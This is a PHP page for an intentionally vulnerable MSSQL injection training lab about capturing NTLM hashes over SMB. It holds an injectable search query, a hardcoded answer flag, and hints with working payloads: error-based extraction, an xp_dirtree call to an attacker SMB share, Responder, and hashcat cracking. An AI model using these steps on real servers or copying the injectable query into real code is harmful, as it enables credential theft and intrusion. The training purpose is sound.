<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    if ($conn) {
        // Live mode: verify against DB
        try {
            $stmt = $conn->query("SELECT TOP 1 flag FROM flags");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && $submitted === $row['flag']) {
                $_SESSION['mssql_lab18_solved'] = true;
                header("Location: " . url_lab_from_slug("mssql/lab18", $mode));
                exit;
            } else {
                $verify_error = "Incorrect. Keep trying!";
            }
        } catch (PDOException $e) {
            $verify_error = "Database error. Is the MSSQL container running?";
        }
    } else {
        // Simulation fallback
        if ($submitted === 'FLAG{ms_ntlm_h4sh_c4ptur3}') {
            $_SESSION['mssql_lab18_solved'] = true;
            header("Location: " . url_lab_from_slug("mssql/lab18", $mode));
            exit;
        } else {
            $verify_error = "Incorrect. Keep trying!";
        }
    }
}
?>
<?php if (!empty($driver_missing)): ?>
<div class="result-warning result-box" style="margin-bottom:16px;">
    <strong>Simulation Mode</strong>: <?= htmlspecialchars($driver_missing) ?> driver not installed.
    Query construction shown for learning. Install the driver for live execution.
</div>
<?php endif; ?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 18. NTLM Hash Capture via SMB</h3>

    <h4>Scenario</h4>
    <p>
        An MSSQL server running on Windows is vulnerable to SQL injection.
        The MSSQL service runs as a domain user account (<code>CORP\sql_service</code>).
        When MSSQL accesses a UNC path, Windows automatically attempts
        <strong>NTLM authentication</strong> to the target SMB server.
    </p>
    <p>
        By forcing the MSSQL server to connect to an attacker-controlled SMB server,
        the attacker can capture the <strong>NTLMv2 hash</strong> of the MSSQL service
        account. This hash can then be cracked offline or used in relay attacks.
    </p>

    <h4>Objective</h4>
    <p>
        Extract the flag from the <code>flags</code> table using error-based extraction.
        The solution explains the NTLM hash capture technique in detail.
        Submit the flag below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Extract flag: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -</code><br>
        2. Start Responder: <code>sudo responder -I eth0</code><br>
        3. Force SMB auth: <code>'; EXEC xp_dirtree '\\attacker_ip\share'; -- -</code><br>
        4. Responder captures NTLMv2 hash of the MSSQL service account.<br>
        5. Crack with hashcat: <code>hashcat -m 5600 hash.txt wordlist.txt</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mssql_lab18_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You extracted the flag and learned about NTLM hash capture via SMB through MSSQL.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Asset Search</h4>
    <form method="POST" class="form-row">
<input type="text" name="q" class="input" placeholder="Search assets (try: server)" value="<?= htmlspecialchars($_POST['q'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['q'])) {
    $q = $_POST['q'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT id, asset_name, asset_type, location FROM assets WHERE asset_name LIKE '%$q%'";

    // Show the executed query in a terminal block
    echo '<div class="terminal">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MSSQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">1&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    if ($conn) {
        try {
            $stmt = $conn->query($query);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (empty($rows)) {
                echo '<div class="result-warning result-box">No assets found.</div>';
            } else {
                foreach ($rows as $row) {
                    echo '<div class="result-data result-box">';
                    echo '<strong>' . htmlspecialchars($row['asset_name'] ?? '') . '</strong>';
                    echo ' &nbsp;&bull;&nbsp; Type: ' . htmlspecialchars($row['asset_type'] ?? '');
                    echo ' &nbsp;&bull;&nbsp; Location: ' . htmlspecialchars($row['location'] ?? '');
                    echo '</div>';
                }
            }
        } catch (PDOException $e) {
            echo '<div class="result-error result-box">';
            echo '<strong>MSSQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
            echo '</div>';
        }
    } else {
        echo '<div class="result-warning result-box">';
        echo '<strong>Simulation Mode:</strong> Query shown above for learning. Install the driver for live results.';
        echo '</div>';
    }
}
?>

<?php endif; ?>
